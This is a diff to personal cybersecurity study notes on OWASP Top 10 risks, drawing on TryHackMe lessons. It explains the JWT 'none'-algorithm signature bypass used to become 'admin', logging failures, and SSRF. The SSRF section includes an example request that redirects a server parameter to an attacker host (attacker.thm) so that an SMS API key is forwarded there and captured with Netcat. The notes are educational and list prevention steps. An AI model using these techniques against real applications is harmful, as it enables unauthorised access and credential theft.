@@ -238,7 +238,17 @@ One solution to maintain data integrity while avoiding re-inventing the wheel, w
 
 JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. 
 - The idea is that you can generate tokens that you can give your users with the certainty that they won't be able to alter the key-value pairs and pass the integrity check. 
-- The structure of a JWT token is formed of 3 parts
+
+#### TryHackMe example :
+
+##### JWT and the None Algorithm
+A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. As we have seen, JWT implements a signature to validate the integrity of the payload data. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:
+1. Modify the header section of the token so that the `alg` header would contain the value `none`.
+2. Remove the signature part.
+Taking the JWT from before as an example, if we wanted to change the payload so that the username becomes "admin" and no signature check is done, we would have to decode the header and payload, modify them as needed, and encode them back. Notice how we removed the signature part but kept the dot at the end.
+
+![[Screenshot from 2024-09-28 15-13-57.png]]
+
 
 
 
@@ -251,6 +261,17 @@ JWTs are very simple tokens that allow you to store key-value pairs on a token t
 
 - A failure to log suspicious login attempts or no monitoring of server errors that indicate attacks
 
+Without logging, there would be no way to tell what actions were performed by an attacker if they gain access to particular web applications. The more significant impacts of these include: 
+- **Regulatory damage:** if an attacker has gained access to personally identifiable user information and there is no record of this, final users are affected, and the application owners may be subject to fines or more severe actions depending on regulations.
+- **Risk of further attacks:** an attacker's presence may be undetected without logging. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.
+
+The information stored in logs should include the following:
+- HTTP status codes
+- Time Stamps
+- Usernames
+- API endpoints/page locations
+- IP addresses
+
 #### Prevention
 - Ensure logging is enabled for all critical events
 - implement monitoring systems to detect attacks and anomalies
@@ -262,7 +283,21 @@ JWTs are very simple tokens that allow you to store key-value pairs on a token t
 > [!NOTE]
 > This occurs when an application fetches a remote resource based on user input but doesn't validate the user-provided URL
 
+This type of vulnerability occurs when an attacker can coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself
+- SSRF vulnerabilities often arise from implementations where our web application needs to use third-party services.
+
+![[Screenshot from 2024-09-28 15-55-19.png]]
+
 - An attacker tricking the server into making requests to internal services or external malicious sites
+By looking at the diagram above, it is easy to see where the vulnerability lies. The application exposes the `server` parameter to the users, which defines the server name of the SMS service provider. If the attacker wanted, they could simply change the value of the `server` to point to a machine they control, and your web application would happily forward the SMS request to the attacker instead of the SMS provider. As part of the forwarded message, the attacker would obtain the API key, allowing them to use the SMS service to send messages at your expense. To achieve this, the attacker would only need to make the following request to your website:
+
+`https://www.mysite.com/sms?server=attacker.thm&msg=ABC`
+
+This would make the vulnerable web application make a request to:
+
+`https://attacker.thm/api/send?msg=ABC` 
+
+You could then just capture the contents of the request using Netcat
 
 #### Prevention
 - Validate and sanitize all URLs before fetching resources, and restrict access to internal services
